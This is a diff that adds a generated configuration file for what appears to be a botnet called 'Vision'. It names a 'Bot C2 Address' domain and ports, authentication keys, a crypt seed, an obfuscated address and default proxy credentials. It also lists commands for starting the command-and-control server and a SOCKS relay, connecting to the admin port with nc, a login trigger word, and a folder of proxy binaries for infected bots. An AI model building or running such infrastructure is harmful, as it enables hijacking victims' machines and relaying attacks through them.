@@ -1,0 +1,36 @@
+============================================================
+Vision Configuration
+Generated: 2026-04-20 12:24:30
+============================================================
+
+[Proxy Server]
+Bot C2 Address: nigsec.drinkingblueteamtears.org:443
+Admin Port: 420
+Bot Ports: 443
+
+[Security]
+Magic Code: UZq1tckrZ0dC1lvQ
+Protocol Version: r1.1-stable
+Crypt Seed: 8e1ac3a7
+Obfuscated Address: 0DvT//nzqFLEIWzZkR1fxUGfy/aGKgU0L4I9TD91SaBpPljTPvEUb2zQGHN8zi+uXOnMoue2Rwc=
+Proxy User: vision
+Proxy Pass: vision
+
+[Relay Server]
+Auth Key: UZq1tckrZ0dC1lvQ
+Control Port: 9001
+SOCKS Port: 1080
+Binary: relay_bins/relay_server
+Start: ./relay_server -key UZq1tckrZ0dC1lvQ -cp 9001 -sp 1080
+
+[Usage]
+1. Start CNC (TUI mode):   ./server
+2. Start CNC (split mode): ./server --split
+3. Connect Admin (split mode): nc nigsec.drinkingblueteamtears.org 420
+4. Login trigger (split mode): spamtec
+5. Proxy binaries: bins/
+6. Start Relay: ./relay_server -key UZq1tckrZ0dC1lvQ
+
+[Modes]
+TUI Mode (default): Local interactive terminal UI, no telnet server needed
+Split Mode (--split): Starts telnet admin server for multi-user remote access
